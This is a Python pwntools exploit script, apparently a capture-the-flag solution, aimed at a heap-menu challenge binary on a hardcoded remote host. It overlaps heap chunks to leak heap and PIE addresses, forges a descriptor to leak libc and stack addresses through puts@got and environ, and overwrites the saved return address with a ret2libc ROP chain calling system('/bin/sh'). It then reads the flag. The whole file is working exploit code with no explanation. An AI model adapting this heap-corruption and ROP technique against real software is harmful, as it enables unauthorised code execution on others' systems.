#!/usr/bin/env python3
from pwn import *

PORT = 45533
HOST = "144.79.188.39"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001EF3
            brva 0x00000000000021B6
            brva 0x0000000000002384
            brva 0x0000000000001A85
            brva 0x0000000000001B86
            brva 0x0000000000001C6A
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'fwdbg> ', str(opt).encode())

def alloc_wellness(marker):
    menu(1)
    sla(b"debug marker: ", str(marker).encode())

def alloc_readiness(marker):
    menu(2)
    sla(b"debug marker: ", str(marker).encode())

def alloc_sensor(sz):
    menu(3)
    sla(b'size (16-256): ', str(sz).encode())

def patch_qword(off, val, idx=1): # sensor_id
    menu(4)
    sla(b"sensor cache id: ", str(idx).encode())
    sla(b"qword offset: ", str(off).encode())
    sla(b"qword patch value: ", str(val).encode())

def release_sensor(idx):
    menu(5)
    sla(b"sensor cache id: ", str(idx).encode())

def dump_readiness(handle):
    menu(6)
    sla(b"descriptor handle: ", str(handle).encode())

def dump_sleep_win(n):
    menu(7)
    sla(b"descriptor handle: ", str(0).encode()) # descriptor_idx = 0
    sla(b"dump length (1-128): ", str(n).encode())

def commit():
    menu(8)
    sla(b"descriptor handle: ", str(0).encode()) # descriptor_idx = 0

## descriptor_table = 0x16360
## sensor_table = 0x16580

# Stage 1: Overlap chunk 0x80 -> Leak heap, PIE

GDB()
alloc_sensor(0x80)  # P
alloc_sensor(0x80)  # P+0x80
release_sensor(0)   # free sensor 0 vào freelist
alloc_wellness(0x100)  # reuse P


dump_readiness(0)
p.recvuntil(b'fw-readiness-counters: ')
heap = int(p.recvuntil(b' ', drop = True), 16)
elf.address = int(p.recvuntil(b' ', drop = True), 16) - 0x5020

log.success(f'heap_addr: {hex(heap)}')
log.success(f'PIE_base: {hex(elf.address)}')

fake = heap + 0x40
window = heap + 0x70
patch_qword(4, fake)       # descriptor + 0xa0 -> fake
patch_qword(10, window)    # fake + 0x10 -> window pointer holder = fake+0x30
patch_qword(12, 1)         # fake + 0x20: enabled = 1
patch_qword(13, 0x80)      # fake + 0x28: max_length

# Stage 2: Leak libc, stack

patch_qword(14, elf.got.puts) # fake + 0x30 -> puts@got
# GDB()
dump_sleep_win(8);
p.recvuntil(b"fw-sleep-stage-window: ")
leak = p.recvline().strip().decode()
libc.address = u64(bytes.fromhex(leak)) - 0x87cc0
log.success(f'libc_base: {hex(libc.address)}')


patch_qword(14, libc.sym.environ)
# GDB()
dump_sleep_win(8);
p.recvuntil(b"fw-sleep-stage-window: ")
leak = p.recvline().strip().decode()
stack = u64(bytes.fromhex(leak))
log.success(f'stack_leak: {hex(stack)}')

# Stage 3: Overwrite saved rip -> ret2libc

rbp = stack - 0x138
rip = rbp + 8

rop = flat(
    libc.address + 0x10c08d + 1,
    libc.address + 0x10c08d,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
    )

patch_qword(6, fake)       # descriptor + 0xb0 -> fake plan
patch_qword(10, window)    # fake + 0x10 -> window {src,dest}
patch_qword(12, 1)         # fake + 0x20: enabled = 1
patch_qword(13, len(rop))  # fake + 0x28: memmove length

pl = rop.ljust((len(rop) + 7) // 8 * 8, b"\x00")
for i in range(0, len(pl), 8):
    patch_qword(i // 8, u64(pl[i:i+8]))

patch_qword(14, heap)  # fake + 0x30 = window[0] = src
patch_qword(15, rip)   # fake + 0x38 = window[1] = dest

# GDB()
commit()

menu(10)
p.sendline(b'cat flag.txt')
p.interactive()